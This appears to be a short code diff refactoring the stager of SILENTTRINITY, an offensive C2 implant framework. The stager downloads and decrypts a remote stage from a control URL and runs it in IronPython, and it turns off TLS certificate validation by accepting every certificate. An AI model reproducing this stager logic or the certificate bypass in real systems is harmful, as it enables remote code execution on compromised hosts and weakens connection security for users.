@@ -10,8 +10,6 @@ namespace SILENTTRINITY
 {
     public class ST
     {
-        static ZipStorer Stage;
-
         static ST()
         {
             ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
@@ -19,6 +17,8 @@ namespace SILENTTRINITY
 
             AppDomain.CurrentDomain.AssemblyResolve += STResolveEventHandler;
         }
+
+        static ZipStorer Stage;
 
         public static async Task Main(string[] args)
         {
@@ -36,11 +36,9 @@ namespace SILENTTRINITY
             Console.WriteLine();
 #endif
 
-            Stage = ZipStorer.Open(new MemoryStream(Crypto.Decrypt(await Crypto.KeyExchangeAsync(URL), 
-                                                                    await Http.GetAsync(URL))),
-                                   FileAccess.ReadWrite, true);
+            Stage = ZipStorer.Open(await Engines.IronPython.GetStage(URL),FileAccess.ReadWrite, true);
 
-            Engines.IronPython.Run(URL, GUID, ref Stage);
+            Engines.IronPython.Run(URL, GUID, Stage);
         }
 
         static Assembly STResolveEventHandler(object sender, ResolveEventArgs args)
